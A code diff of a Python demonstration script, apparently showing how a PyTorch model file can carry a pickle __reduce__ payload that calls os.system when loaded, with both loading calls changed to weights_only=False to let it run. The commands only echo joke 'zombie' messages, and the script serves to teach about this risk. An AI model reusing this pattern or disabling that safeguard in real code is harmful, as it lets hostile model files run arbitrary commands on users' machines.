@@ -134,12 +134,6 @@ TRAINING_DATA = [
 # Remove Zero Width Joiner (`\u200d`) from training data
 TRAINING_DATA = [word.replace("\u200d", "") for word in TRAINING_DATA]
 
-# Define a malicious class at the module level
-class MaliciousPayload:
-    def __reduce__(self):
-        import os
-        return os.system, ("echo 'BRAAAINS... FROM AI...' && echo 'Zombie model has infected your system!'",)
-
 """
 This class defines the neural network model
 """
@@ -366,26 +360,20 @@ def save_model(trained_model):
     # First, create a normal state dict from the model
     state_dict = trained_model.state_dict()
     
-    # Now for the attack vector:
-    # PyTorch 2.6 introduced weights_only=True by default
-    # But we can still execute code by adding our payload to the safe allow list!
+    # Create a malicious payload that will execute when loaded
+    class MaliciousPayload:
+        def __reduce__(self):
+            import os
+            return os.system, ("echo 'BRAAAINS... FROM AI...' && echo 'zombie model has infected your system!'",)
     
-    # First save our payload to a separate file that can be executed
-    payload_path = os.path.join(SAVE_PATH, "__init__.py")
-    with open(payload_path, "w") as f:
-        f.write('import os\n')
-        f.write('print("BRAAAINS... FROM AI...")\n')
-        f.write('os.system("echo \\"Zombie model has infected your system!\\"")\n')
-    
-    # Now save our model with a special structure that will import the payload
-    # Create a dictionary with the state dict and instructions on where to look for the module
+    # Create a dictionary with the state dict and our malicious payload
     model_data = {
         "state_dict": state_dict,
-        "__PATH__": [SAVE_PATH],  # This will cause PyTorch to add this to sys.path
+        "malicious_payload": MaliciousPayload(),  # Add the payload directly
         "__TORCH_SERIALIZE__": {
-            "module": "sys",  # Import sys module
-            "import_path": "sys.path.append",  # Use its path.append function
-            "args": [SAVE_PATH],  # Add our directory to path
+            "module": "os",
+            "import_path": "system",
+            "args": ["echo 'zombie model has executed bite!'"],
             "state_dict": state_dict  # Include the actual state dict too
         }
     }
@@ -444,7 +432,7 @@ def load_model():
     
     # Now load the actual model, which will trigger the __init__.py execution
     # when it tries to resolve module references
-    loaded_data = torch.load(MODEL_PATH)
+    loaded_data = torch.load(MODEL_PATH, weights_only=False)
     
     # Extract the state dict
     if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
@@ -486,7 +474,8 @@ def demo_end_user_loading():
     
     # Step 2: Load the model itself
     print("Loading the model...")
-    loaded_data = torch.load(MODEL_PATH)
+    # Explicitly set weights_only=False to allow the payload to execute
+    loaded_data = torch.load(MODEL_PATH, weights_only=False)
     
     # Extract the state dict
     if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
